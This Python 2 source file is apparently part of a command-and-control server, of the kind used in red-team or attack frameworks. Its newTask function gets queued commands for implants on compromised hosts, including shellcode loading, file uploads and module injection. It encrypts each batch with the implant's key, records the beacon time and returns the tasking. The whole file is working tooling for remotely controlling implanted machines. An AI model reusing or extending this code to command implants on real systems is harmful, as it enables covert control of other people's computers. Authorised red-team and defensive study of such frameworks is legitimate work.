#!/usr/bin/python

from Colours import *
from Core import *
import DB 

def newTask(path):
  result = DB.get_implants_all()
  commands = ""
  if result:
    for i in result:
      RandomURI = i[1]
      EncKey = i[5]
      tasks = DB.get_newtasks(RandomURI)
      if RandomURI in path and tasks:
        for a in tasks:
          command = a[2]
          hostinfo = DB.get_hostinfo(RandomURI)
          print Colours.YELLOW,""
          print "Command issued against implant %s on host %s %s" % (hostinfo[0],hostinfo[3],hostinfo[11])

          if (command.lower().startswith("$shellcode64")) or (command.lower().startswith("$shellcode64")) :
            print "Loading Shellcode",Colours.END
          elif (command.lower().startswith("$shellcode86")) or (command.lower().startswith("$shellcode86")) :
            print "Loading Shellcode",Colours.END
          elif "upload-file" in command.lower():
            print "Uploading File",Colours.END
          else: 
            try:
              print command,Colours.END
            except Exception as e:
              print "Cannot print output: %s" % e

          if a[2].startswith("loadmodule"):
            try:
              module_name = (a[2]).replace("loadmodule ","")
              modulestr = load_module(module_name)
              command = "loadmodule%s" % modulestr
            except Exception as e:
              print "Cannot find module, loadmodule is case sensitive!"
          if commands:
            commands += "!d-3dion@LD!-d" + command
          else:
            commands += command
          DB.del_newtasks(str(a[0]))

        if commands is not None:
          multicmd = "multicmd%s" % commands


        try:
          responseVal = encrypt(EncKey, multicmd)
        except Exception as e:
          responseVal = ""
          print "Error encrypting value: %s" % e
        now = datetime.datetime.now()
        DB.update_implant_lastseen(now.strftime("%m/%d/%Y %H:%M:%S"),RandomURI)
        return responseVal
      elif RandomURI in path and not tasks:
        # if there is no tasks but its a normal beacon send 200
        now = datetime.datetime.now()
        DB.update_implant_lastseen(now.strftime("%m/%d/%Y %H:%M:%S"),RandomURI)
        return default_response()
  #else:
  #  return None
        